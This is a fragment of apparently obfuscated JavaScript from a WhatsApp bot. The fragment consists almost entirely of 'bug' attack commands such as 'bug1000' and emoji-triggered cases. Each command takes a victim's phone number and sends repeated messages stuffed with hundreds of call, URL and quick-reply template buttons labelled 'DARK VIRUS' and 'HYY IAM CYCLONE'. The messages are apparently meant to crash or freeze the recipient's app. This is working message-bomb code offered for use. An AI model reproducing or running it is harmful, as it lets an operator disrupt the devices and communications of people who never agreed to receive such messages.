/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quoted':lep}]});}}
diablobotwhatsapp.reply(`DONEâ`)
await sleep(ms(waktu))
break
case 'ðĨ':
case 'ðŋ': 
case 'ðĨķ': 
case 'ðĶ':
case 'ðĢ': 
case 'ðĨĩ': 
case 'ð·':
case 'âĒïļ':
case 'ðĨ':
case 'â ïļ':
case 'ðķ':
case 'ð·':
case 'ð':

case 'ðŧ':
case 'bug1000':
         
         if (!itsMediablo) return diablobotwhatsapp.reply(`Own only`)

        
    
      if (!q) return 
        num = `${q}`+'@s.whatsapp.net'
        jumlah = '10'
        waktu = `10s`
for (let i = 0; i < jumlah; i++) {
diablo.sendMessage(num, {
text: 'BUG BY Sanzz', 
templateButtons: [
   { callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
   { callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
 { callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
 { callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ DARK VIRUS âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
